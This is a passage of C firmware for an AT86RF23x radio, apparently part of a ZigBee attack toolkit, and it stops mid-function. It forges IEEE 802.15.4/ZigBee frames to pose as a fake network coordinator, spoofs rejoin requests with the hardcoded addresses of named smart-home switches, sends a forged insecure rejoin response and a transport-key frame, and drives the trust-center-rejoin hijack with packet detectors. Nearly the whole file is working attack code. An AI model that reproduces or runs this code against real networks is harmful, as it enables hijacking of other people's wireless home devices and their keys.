/*
 * fw/attacks/attack_12.c
 *
 * Written 2021 by Jincheng
 * Copyright 2021 Jincheng Wang
 *
 */

#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"

#include "zbee/packet-ieee802154.h"


uint8_t mac_seq = -1;
uint8_t nwk_seq = -1;

uint8_t stat = IDLE_STATE;

typedef union {
	uint8_t byte0;
	uint8_t byte1;
	uint16_t addr;
}addr_16;

typedef struct {
	uint8_t aack_flag;
	addr_16 target_short_addr;
	addr_16 target_pan_id;
	uint8_t dis_ack;
	uint8_t pending;
}rx_aack_config;

/********  Standard Library *******/

static void read_garbage(uint8_t n)
{
	while (n--)
	{
		// _delay_us(32);
		spi_recv();
	}
}

static int read_bytes(uint8_t* arr, uint8_t length) {
	memset(arr, 0, sizeof(uint8_t) * length);
	uint8_t i = 0;

	for(i = 0; i < length; i++){
		arr[i] = spi_recv();
		_delay_us(32);
	}
	return i;
}

static int reg_state_check(uint8_t check_stat) {
	uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;

	if (check_stat == TRX_STATUS_RX_ON || check_stat == TRX_STATUS_RX_AACK_ON) {
		while(reg_status != TRX_STATUS_RX_ON && reg_status != TRX_STATUS_RX_AACK_ON) {
			reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		}
	}
	else if (check_stat == TRX_STATUS_PLL_ON) {
		while(reg_status != check_stat) {
			reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		}
	}

	return 1;
}


/********  Command Library ********/

/**
 * @brief  set_rx_aack: Set the required registers used for RX_AACK mode, then transfer the state to RX_AACK
 * @note   
 * @param  aack_config: Config used to set RX_AACK
 * @retval None
 */
void set_rx_aack(rx_aack_config* aack_config)
{
	// This function is mostly called when there is packets being sent. So first make sure that current packet has been sent out.
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_BUSY_TX);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_BUSY_TX_ARET);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_TX_ARET_ON);

	// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON);

	// Here we need to configure address for AACK, then transist into AACK mode
	reg_write(REG_SHORT_ADDR_0, aack_config->target_short_addr.byte0);
	reg_write(REG_SHORT_ADDR_1, aack_config->target_short_addr.byte1);
	reg_write(REG_PAN_ID_0, aack_config->target_pan_id.byte0);
	reg_write(REG_PAN_ID_1, aack_config->target_pan_id.byte1);

	// Set registers used by RX_AACK. Please refer to Page 55 in AT86RF231 spec.
	reg_write(0x0c, 0x00);
	if(!aack_config->dis_ack) {
		reg_write(0x2c, 0x38);
	}
	else {
		reg_write(0x2c, 0x38 | AACK_DIS_ACK);
	}
	if(!aack_config->pending) {
		reg_write(0x2e, 0xc2);
	}
	else {
		reg_write(0x2e, 0xc2 | AACK_SET_PD);
	}

	// Transist to RX_AACK_ON mode
	change_state(TRX_CMD_RX_AACK_ON);
	uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;

	// Finally, make sure the state transition is right
	while(reg_status != TRX_CMD_RX_AACK_ON && reg_status != TRX_STATUS_BUSY_RX_AACK)
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	}
}

/**
 * @brief  send_zbee_cmd: Create and send ZigBee commands
 * @note   
 * @param  payload: 
 * @param  auto_ack: 
 * @retval None
 */
void send_zbee_cmd(unsigned char* payload, rx_aack_config* aack_config)
{
	// 1: Change Transciver state to TRX_CMD_FORCE_PLL_ON
	change_state(TRX_CMD_FORCE_PLL_ON);

	// 2: Send Packets
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	/** TODO: Here we need to deal with the packet.
	 * A possible way is to:
	 * 1. Design a better packet structure.
	 * 2. Design an interface, instead of using plenty of spi_send()
	**/
	spi_end();

	// 3: Send the packet
	change_state(TRX_STATUS_TX_ARET_ON);
	slp_tr();

	// 4: Determine and configure the afterwards mode
	if (aack_config->aack_flag)
	{
		set_rx_aack(aack_config);
	}
	else
	{
		// If RX_AACK is not needed, here we simply transform the state to PLL_ON
		change_state(TRX_CMD_PLL_ON);
	}
}

/********  MAC Command Library *******/

void send_data_request()
{

	change_state(TRX_CMD_FORCE_PLL_ON);

	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	spi_send(10+2); //CRC
	// FCF
	spi_send(0x63); spi_send(0x88);
	// MAC Sequence
	spi_send(0xff);
	// Dest PAN ID
	spi_send(0xa2); spi_send(0x2c);
	// Dest Addr
	spi_send(0x00); spi_send(0x00);
	// Source Addr
	spi_send(0xc7); spi_send(0x02);

	//* MAC payload
	// Command frame
	spi_send(0x04);
	spi_end();

	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	/* Give a rising edge on SLP_TR pin to trigger TX_ARET transaction */
	slp_tr();

	// Set RX_AACK_ON
	rx_aack_config aack_config = {};
	aack_config.aack_flag = 1;
	aack_config.target_pan_id.byte0 = 0xa2; aack_config.target_pan_id.byte1 = 0x2c;
	aack_config.target_short_addr.byte0 = 0xc7; aack_config.target_short_addr.byte1 = 0x02;

	set_rx_aack(&aack_config);
}

void send_beacon_request()
{
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	spi_send(8+2); //CRC
	// FCF
	spi_send(0x03); spi_send(0x08);
	// MAC Sequence
	spi_send(0xff);
	// Dest PAN ID
	spi_send(0xff); spi_send(0xff);
	// Dest Addr
	spi_send(0xff); spi_send(0xff);

	//* MAC payload
	// Command ID
	spi_send(0x07);
	spi_end();

	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	/* Give a rising edge on SLP_TR pin to trigger TX_ARET transaction */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_PLL_ON);
	// change_state(TRX_CMD_RX_ON);
}

void send_beacon_response() // Here we pretend to be a fake ZC with NWKaddr = 0x0000, PANID = 0x3412
{
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif
	uint8_t rx_aack =  1;
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	spi_send(26+2); //CRC
	// FCF
	spi_send(0x00); spi_send(0x80);
	// MAC Sequence
	spi_send(0xff);
	// Source PAN ID
	spi_send(0x12); spi_send(0x34);
	// Source Addr
	spi_send(0x00); spi_send(0x00);
	// Superframe
	spi_send(0xff); spi_send(0x4f);
	// GTS
	spi_send(0x00);
	// Pending
	spi_send(0x00);
	// ZigBee Beacon
	//Protocol
	spi_send(0x00);
	// Beacon
	spi_send(0x22); spi_send(0x84);
	// Extended PAN ID
	spi_send(0xec); spi_send(0xd3); spi_send(0xa6); spi_send(0x2e); spi_send(0x5c); spi_send(0xda); spi_send(0xb4); spi_send(0x0a);
	// TX Offset
	spi_send(0xff); spi_send(0xff); spi_send(0xff);
	// Updated ID
	spi_send(0x01);
	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	/* Give a rising edge on SLP_TR pin to trigger TX_ARET transaction */
	slp_tr();

	// Change status to RX_AACK
	if (rx_aack)
	{
		rx_aack_config aack_config = {};
		aack_config.aack_flag = 1;
		aack_config.target_pan_id.byte0 = 0xa2; aack_config.target_pan_id.byte1 = 0x2c;
		aack_config.target_short_addr.byte0 = 0x00; aack_config.target_short_addr.byte1 = 0x00;
		set_rx_aack(&aack_config);
	}
	else
	{
		change_state(TRX_CMD_RX_ON);
	}
}
/********  NWK Command Library *******/

void send_rejoin_request(union Integer mac_addr, uint8_t rx_on_when_idle)
{
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	spi_send(27+2); //CRC
	// FCF
	spi_send(0x61); spi_send(0x88);
	// MAC Sequence
	spi_send(0xff);
	// Dest PAN ID
	spi_send(0xa2); spi_send(0x2c);
	// Dest Addr
	spi_send(0x00); spi_send(0x00);
	// Source Addr
	spi_send(0xc7); spi_send(0x02);

	//* MAC payload
	// NWK FCF
	spi_send(0x09); spi_send(0x10);

	// Dest addr
	spi_send(0x00); spi_send(0x00);
	// Source
	spi_send(0xc7); spi_send(0x02);
	// Radius
	spi_send(0x01);
	// Sequence Number
	spi_send(0xff);

	// Dest Extended Addr
	// spi_send(0xbc); spi_send(0x8e); spi_send(0x0d); spi_send(0x01); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28); // ST sensor

	// Source Extended Addr: Start with 0xbc
	// spi_send(0xbc); spi_send(0x8e); spi_send(0x0d); spi_send(0x01); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28); // ST sensor
	spi_send(mac_addr.bytes[3]); spi_send(mac_addr.bytes[2]); spi_send(mac_addr.bytes[1]); spi_send(mac_addr.bytes[0]); spi_send(0x01); spi_send(0x97); spi_send(0x6d); spi_send(0x28);
	// spi_send(0x14); spi_send(0x4a); spi_send(0x05); spi_send(0x02); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);

	//* Command Frame
	// Command ID
	spi_send(0x06);
	// Capability Info
	if (rx_on_when_idle)
	{
		spi_send(0x88);
	}
	else
	{
		spi_send(0x80);
	}	
	spi_end();

	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	slp_tr();

	if (rx_on_when_idle)
	{
		rx_aack_config aack_config = {};
		aack_config.aack_flag = 1;
		aack_config.target_pan_id.byte0 = 0xa2; aack_config.target_pan_id.byte1 = 0x2c;
		aack_config.target_short_addr.byte0 = 0x00; aack_config.target_short_addr.byte1 = 0x00;
		set_rx_aack(&aack_config);
	}
	else
	{
		change_state(TRX_CMD_PLL_ON);
	}
}

void send_rejoin_request_device(union Integer mac_addr, uint8_t rx_on_when_idle)
{
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	spi_send(27+2); //CRC
	// FCF
	spi_send(0x61); spi_send(0x88);
	// MAC Sequence
	spi_send(0xff);
	// Dest PAN ID
	spi_send(0xa2); spi_send(0x2c);
	// Dest Addr
	spi_send(0x00); spi_send(0x00);
	// Source Addr
	spi_send(0x93); spi_send(0xaf);

	//* MAC payload
	// NWK FCF
	spi_send(0x09); spi_send(0x10);

	// Dest addr
	spi_send(0x00); spi_send(0x00);
	// Source
	spi_send(0x93); spi_send(0xaf);
	// Radius
	spi_send(0x01);
	// Sequence Number
	spi_send(0xff);

	// Dest Extended Addr
	// spi_send(0xbc); spi_send(0x8e); spi_send(0x0d); spi_send(0x01); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28); // ST sensor

	// Source Extended Addr: Start with 0xbc
	// spi_send(0xbc); spi_send(0x8e); spi_send(0x0d); spi_send(0x01); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28); // ST sensor
	// spi_send(0x71); spi_send(0xd8); spi_send(0x22); spi_send(0x03); spi_send(0x00); spi_send(0x8d); spi_send(0x15); spi_send(0x00); // Xiaomi Switch
	spi_send(0xcc); spi_send(0x7a); spi_send(0xf4); spi_send(0x08); spi_send(0x01); spi_send(0x88); spi_send(0x17); spi_send(0x00); // Hue Dimmer Switch
	//spi_send(mac_addr.bytes[3]); spi_send(mac_addr.bytes[2]); spi_send(mac_addr.bytes[1]); spi_send(mac_addr.bytes[0]); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);
	// spi_send(0x14); spi_send(0x4a); spi_send(0x05); spi_send(0x02); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);

	//* Command Frame
	// Command ID
	spi_send(0x06);
	// Capability Info
	if (rx_on_when_idle)
	{
		spi_send(0x8e);
	}
	else
	{
		spi_send(0x80);
	}	
	spi_end();

	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	slp_tr();

	if (rx_on_when_idle)
	{
		rx_aack_config aack_config = {};
		aack_config.aack_flag = 1;
		aack_config.target_pan_id.byte0 = 0xa2; aack_config.target_pan_id.byte1 = 0x2c;
		aack_config.target_short_addr.byte0 = 0x34; aack_config.target_short_addr.byte1 = 0x12;
		set_rx_aack(&aack_config);
	}
	else
	{
		change_state(TRX_CMD_PLL_ON);
	}
}

void send_rejoin_response() // Here we pretend to be a fake ZC with IEEaddr= true ZC's addr, NWKaddr = 0x0000, PANID = 0x3412
{
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	uint8_t secure_bit = 0; // Insecure Response
	/* Wait for the transmission of the spoofed packet */
	_delay_us(32);

	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	if (secure_bit == 1)
	{
		spi_send(57);
	}
	else
	{
		spi_send(39);
	}
	// FCF
	spi_send(0x61); spi_send(0x88);
	// MAC Sequence
	spi_send(0xff);
	// Dest PAN ID
	spi_send(0x12); spi_send(0x34);
	// Dest Addr
	spi_send(0x38); spi_send(0x2d);
	// Source Addr
	spi_send(0x00); spi_send(0x00);

	//* NWK Header
	if (secure_bit == 1)
	{
		spi_send(0x09); spi_send(0x1a);
	}
	else
	{
		spi_send(0x09); spi_send(0x18);
	}
	// Dest addr
	spi_send(0x38); spi_send(0x2d);
	// Source
	spi_send(0x00); spi_send(0x00);
	// Radius
	spi_send(0x01);
	// NWK sequence Number
	spi_send(0xff);
	// Dest Extended Addr
	// spi_send(0xbc); spi_send(0x8e); spi_send(0x0d); spi_send(0x01); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);
	spi_send(0xcc); spi_send(0x7a); spi_send(0xf4); spi_send(0x08); spi_send(0x01); spi_send(0x88); spi_send(0x17); spi_send(0x00); // Philips Hue Switch
	// Source Extended Addr
	spi_send(0x14); spi_send(0x4a); spi_send(0x05); spi_send(0x02); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);
	if (secure_bit == 1) // Add Security Header and encrypted payload here
	{
		// Security Control Field
		spi_send(0x28);
		// Frame Counter
		spi_send(0xee);spi_send(0xee);spi_send(0xee);spi_send(0xee);
		// Extended Source
		spi_send(0x14); spi_send(0x4a); spi_send(0x05); spi_send(0x02); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);
		// Key Sequence Number
		spi_send(0x01);

		// Encrypted Payload
		spi_send(0x11); spi_send(0x11); spi_send(0x11); spi_send(0x11);

		// Message Integrity Code
		spi_send(0x00); spi_send(0x00); spi_send(0x00); spi_send(0x00);
		spi_end();
	}
	else
	{
		//* Command Frame
		// Command ID
		spi_send(0x07);
		// New Address
		spi_send(0x38); spi_send(0x2d);
		// Status
		spi_send(0x00);
		spi_end();
	}
	

	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	/* Give a rising edge on SLP_TR pin to trigger TX_ARET transaction */
	slp_tr();

	uint8_t rx_aack = 1;

	if (rx_aack)
	{
		while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_BUSY_TX_ARET); 
		while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_TX_ARET_ON);

		// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
		change_state(TRX_CMD_FORCE_PLL_ON);
		while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON);

		// Here we need to configure address for AACK, then transist into AACK mode
		reg_write(REG_SHORT_ADDR_0, 0x00);
		reg_write(REG_SHORT_ADDR_1, 0x00);
		reg_write(REG_PAN_ID_0, 0x12);
		reg_write(REG_PAN_ID_1, 0x34);
		reg_write(0x17, 0x02); // AACK_ACK_TIME: Send ACK quickly. Default value for 0x17: 0x00
		reg_write(0x0c, 0x00);
		reg_write(0x2c, 0x38);
		reg_write(0x2e, 0xc2);
		// Transist to states
		change_state(TRX_CMD_RX_AACK_ON);
		uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		// Make sure the state transition is right
		while(reg_status != TRX_CMD_RX_AACK_ON && reg_status != TRX_STATUS_BUSY_RX_AACK)
		{
			reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		}
	}
	else
	{
		change_state(TRX_CMD_RX_ON);
	}
}

/********  APS Command Library *******/
void send_transport_key()
{
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	uint8_t secure_bit = 1;
	/* Wait for the transmission of the spoofed packet */
	_delay_us(32);

	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Send length
	if (secure_bit == 1)
	{
		spi_send(71 + 2);
	}
	else
	{
		spi_send(39);
	}
	// FCF
	spi_send(0x61); spi_send(0x88);
	// MAC Sequence
	spi_send(0xff);
	// Dest PAN ID
	spi_send(0x12); spi_send(0x34);
	// Dest Addr
	spi_send(0x38); spi_send(0x2d);
	// Source Addr
	spi_send(0x00); spi_send(0x00);

	//* NWK Header
	// FCF
	spi_send(0x08); spi_send(0x00);
	// Dest addr
	spi_send(0x38); spi_send(0x2d);
	// Source
	spi_send(0x00); spi_send(0x00);
	// Radius
	spi_send(0x1e);
	// NWK sequence Number
	spi_send(0xff);
	
	//* APS Layer
	// FCF
	spi_send(0x21);
	// Counter
	spi_send(0xff);

	if (secure_bit == 1) // Add Security Header and encrypted payload here
	{
		// Security Control Field
		spi_send(0x30);
		// Frame Counter
		spi_send(0xaa);spi_send(0xaa);spi_send(0xaa);spi_send(0xaa);
		// Extended Source
		spi_send(0x14); spi_send(0x4a); spi_send(0x05); spi_send(0x02); spi_send(0x00); spi_send(0x97); spi_send(0x6d); spi_send(0x28);

		//* Encrypted Payload
		spi_send(0x1f); spi_send(0xd0); spi_send(0x09); spi_send(0x1b); spi_send(0xb8);
		spi_send(0x1f); spi_send(0x19); spi_send(0x7d); spi_send(0x4e); spi_send(0x50);
		spi_send(0x1c); spi_send(0xea); spi_send(0x75); spi_send(0xc9); spi_send(0xe0);
		spi_send(0xd1); spi_send(0x88); spi_send(0x39); spi_send(0xc1); spi_send(0x3e);
		spi_send(0xda); spi_send(0x8f); spi_send(0x53); spi_send(0x6f); spi_send(0x14);
		spi_send(0x70); spi_send(0x60); spi_send(0x5a); spi_send(0xb1); spi_send(0xca);
		spi_send(0x0f); spi_send(0xda); spi_send(0x22); spi_send(0xd3); spi_send(0x0e);


		// Message Integrity Code
		spi_send(0xc6); spi_send(0xcd); spi_send(0xa7); spi_send(0xf6);
		spi_end();
	}
	else
	{
		//* Command Frame
		// Command ID
		spi_send(0x07);
		// New Address
		spi_send(0x38); spi_send(0x2d);
		// Status
		spi_send(0x00);
		spi_end();
	}
	

	/* Transition into CSMA-CA TX mode to make sure that this frame will be successuly sent without collision. */
	change_state(TRX_STATUS_TX_ARET_ON);
	/* Give a rising edge on SLP_TR pin to trigger TX_ARET transaction */
	slp_tr();

	uint8_t rx_aack = 1;

	if (rx_aack)
	{
		while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_BUSY_TX_ARET); 
		while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_TX_ARET_ON);

		// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
		change_state(TRX_CMD_FORCE_PLL_ON);
		while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON);

		// Here we need to configure address for AACK, then transist into AACK mode
		reg_write(REG_SHORT_ADDR_0, 0x00);
		reg_write(REG_SHORT_ADDR_1, 0x00);
		reg_write(REG_PAN_ID_0, 0x12);
		reg_write(REG_PAN_ID_1, 0x34);
		reg_write(0x17, 0x02); // AACK_ACK_TIME: Send ACK quickly. Default value for 0x17: 0x00
		reg_write(0x0c, 0x00);
		reg_write(0x2c, 0x38);
		reg_write(0x2e, 0xc2);
		// Transist to states
		change_state(TRX_CMD_RX_AACK_ON);
		uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		// Make sure the state transition is right
		while(reg_status != TRX_CMD_RX_AACK_ON && reg_status != TRX_STATUS_BUSY_RX_AACK)
		{
			reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		}
	}
	else
	{
		change_state(TRX_CMD_RX_ON);
	}
}

/********  Detect-Specific Library *******/

/*
* @return:
*	0 if it is a beacon request
*	1 if it is an secure rejoin request
*	2 if it is an insecure rejoin request
*	3 if it is a data request
*/
uint8_t detect_packet_type()
{
	uint8_t phy_len = 0;
	uint8_t jam_len = 0;
	uint8_t radius = 0;

	uint8_t flag = 100;

	uint8_t fcf[2];
	uint8_t saddr[2];
	uint8_t daddr[2];
	uint8_t dstpan[2];

	uint8_t analyze_nwk = 0;
	uint8_t analyze_mac = 1;
	uint8_t analyze_mac_addr = 1;
	uint8_t command_id = 0;

	spi_begin();
	spi_io(AT86RF230_BUF_READ);
	// Analyze phy len
	phy_len = spi_recv();
	if (phy_len <= 7) {
		spi_end();
		return 0;
	}
	// Analyze MAC
	if (analyze_mac) {
		// Check MAC FCF
		_delay_us(32);
		fcf[0] = spi_recv();
		_delay_us(32);
		fcf[1] = spi_recv();
		if((fcf[0] == 0x03) && (fcf[1] == 0x08)) // Beacon Request
		{
			flag = 0;
		}
		else if ((fcf[0] == 0x61) && (fcf[1] == 0x88)) // NWK Rejoin Request
		{
			if (phy_len < 35) {
				flag = 2;  // Insecure Rejoin
			}
			else {
				flag = 1;
			}
		}
		else if ((fcf[0] == 0x63) && (fcf[1] == 0x88)) // Data Request
		{
			flag = 3;
		}
	}
	// We need to further judge whether the rejoin is a secure rejoin or not.
	spi_end();	
	return flag;
}

bool detect_beacon_request()
{
	uint8_t phy_len = 0;
	uint8_t jam_len = 0;
	uint8_t radius = 0;

	uint8_t fcf[2];
	uint8_t saddr[2];
	uint8_t daddr[2];
	uint8_t dstpan[2];

	uint8_t analyze_nwk = 0;
	uint8_t analyze_mac = 1;
	uint8_t analyze_mac_addr = 1;
	uint8_t command_id = 0;

	uint8_t nwkfcf[2];
	uint8_t nwkdaddr[2];
	uint8_t nwksaddr[2];
	

	// Time eplased(Since the packet sends out): 192 + t_IRQ
	spi_begin();
	spi_io(AT86RF230_BUF_READ);
	// Analyze phy len
	phy_len = spi_recv();
	if (phy_len <= 7) {
		spi_end();
		return 0;
	}
	// Analyze MAC
	if (analyze_mac) {
		// Check MAC FCF
		_delay_us(32);
		fcf[0] = spi_recv();
		_delay_us(32);
		fcf[1] = spi_recv();
		// Record Sequence umber in MAC
		_delay_us(32);
		mac_seq = spi_recv();
		if (analyze_mac_addr)
		{
			// Record dest pan
			_delay_us(32);
			dstpan[0] = spi_recv();
			_delay_us(32);
			dstpan[1] = spi_recv();
			// Check Dest Addr	
			_delay_us(32);
			daddr[0] = spi_recv();
			_delay_us(32);
			daddr[1] = spi_recv();
			// Check Command Identifier
			_delay_us(32);
			command_id = spi_recv();
			if(command_id == 0x07)
			{
				spi_end();
				return 1;
			}
		}
	}
	spi_end();	
	return 0;
}

bool detect_rejoin_request() // Here we detect FCF, and dstNWKaddr=0x0066, dstPANID=0x3412
{
	uint8_t phy_len = 0;
	uint8_t jam_len = 0;
	uint8_t radius = 0;

	uint8_t fcf[2];
	uint8_t saddr[2];
	uint8_t daddr[2];
	uint8_t dstpan[2];

	uint8_t analyze_nwk = 0;
	uint8_t analyze_mac = 1;
	uint8_t analyze_mac_addr = 1;
	uint8_t command_id = 0;

	uint8_t nwkfcf[2];
	uint8_t nwkdaddr[2];
	uint8_t nwksaddr[2];
	
	spi_begin();
	spi_io(AT86RF230_BUF_READ);
	// Analyze phy len
	phy_len = spi_recv();
	if (phy_len <= 40) {
		spi_end();
		return 0;
	}
	// Analyze MAC
	if (analyze_mac) {
		// Check MAC FCF
		_delay_us(32);
		fcf[0] = spi_recv();
		_delay_us(32);
		fcf[1] = spi_recv();
		if ((fcf[0] != 0x61) && (fcf[1] != 0x88))
		{
			spi_end();
			return 0;
		}
		// Record Sequence umber in MAC
		_delay_us(32);
		mac_seq = spi_recv();
		if (analyze_mac_addr)
		{
			// Record dest pan
			_delay_us(32);
			dstpan[0] = spi_recv();
			_delay_us(32);
			dstpan[1] = spi_recv();
			if((dstpan[0] != 0x12) && (dstpan[1] != 0x34))
			{
				spi_end();
				return 0;
			}
			// Check Dest Addr	
			_delay_us(32);
			daddr[0] = spi_recv();
			_delay_us(32);
			daddr[1] = spi_recv();
			if((daddr[0] != 0x66) && (daddr[1] != 0x00))
			{
				spi_end();
				return 0;
			}
		}
	}
	spi_end();	
	return 1;
}

bool detect_data_request() // Here we detect FCF, and dstNWKaddr=0x0066, dstPANID=0x3412
{
	uint8_t phy_len = 0;
	uint8_t jam_len = 0;
	uint8_t radius = 0;

	uint8_t fcf[2];
	uint8_t saddr[2];
	uint8_t daddr[2];
	uint8_t dstpan[2];

	uint8_t analyze_nwk = 0;
	uint8_t analyze_mac = 1;
	uint8_t analyze_mac_addr = 1;
	uint8_t command_id = 0;

	uint8_t nwkfcf[2];
	uint8_t nwkdaddr[2];
	uint8_t nwksaddr[2];
	
	spi_begin();
	spi_io(AT86RF230_BUF_READ);
	// Analyze phy len
	phy_len = spi_recv();
	if (phy_len <= 10) {
		spi_end();
		return 0;
	}
	// Analyze MAC
	if (analyze_mac) {
		// Check MAC FCF
		_delay_us(32);
		fcf[0] = spi_recv();
		_delay_us(32);
		fcf[1] = spi_recv();
		if ((fcf[0] != 0x63) && (fcf[1] != 0x88))
		{
			spi_end();
			return 0;
		}
		// Record Sequence umber in MAC
		_delay_us(32);
		mac_seq = spi_recv();
		if (analyze_mac_addr)
		{
			// Record dest pan
			_delay_us(32);
			dstpan[0] = spi_recv();
			_delay_us(32);
			dstpan[1] = spi_recv();
			if((dstpan[0] != 0x12) && (dstpan[1] != 0x34))
			{
				spi_end();
				return 0;
			}
			// Check Dest Addr	
			_delay_us(32);
			daddr[0] = spi_recv();
			_delay_us(32);
			daddr[1] = spi_recv();
			if((daddr[0] != 0x66) && (daddr[1] != 0x00))
			{
				spi_end();
				return 0;
			}
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			command_id = spi_recv();
			if(command_id != 0x04)
			{
				spi_end();
				return 0;
			}
		}
	}
	spi_end();	
	return 1;
}


/********  Attack-Specific Functions *******/
/**
 * @brief  process_trust_center_rejoin contains process flow of trust center rejoin.
 * 1. Waiting for beacon request, and reply with beacon response.
 * 2. Waiting for Trust Center Rejoin Request and Data Request; Replying ACK with valid data pending flags.
 * 3. Replying Trust Center Rejoin Response.
 * 4. Waiting for Data Request; Replying Transport-Key Command.
 * 5. Replying all further messages with ACK
 * 
 * @param  *rejoin_response_flag: The flag used to mark current process of trust center rejoin.
 * 
 * @retval None
 */

void process_trust_center_rejoin(uint8_t *rejoin_response_flag)
{
	uint8_t flag = detect_packet_type();
	/*
	*
	* First, Replying ACK according to packet type.
	*
	*/
	if (flag == 0) // Beacon Request
	{
		send_beacon_response();
		*rejoin_response_flag = 0;
	}
	else if (flag == 1) // Secure NWK Rejoin Request
	{
		// We don't want to reply to secure Rejoin Request
		// That is, we disable generation of ACK here. 0x2e default value: 0xc2
		reg_write(0x2e, 0xd2);
	}
	else if (flag == 2) // Insecure NWK Rejoin Request
	{
		// We reply with ACK
		reg_write(0x2e, 0xc2);
	}
	else if (flag == 3) // Data Request
	{
		// Set data pending bit. Default value: 0xc2
		reg_write(0x2e, 0xe2);
	}
	else // Unknown packet
	{

	}
	// <Wait for finishing sending ACK?>
	uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	// Make sure the state transition is right
	while(reg_status != TRX_CMD_RX_AACK_ON)
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	}

	// <ACK sending done?>
	if (flag == 3)
	{
		if (*rejoin_response_flag == 0) 
		{
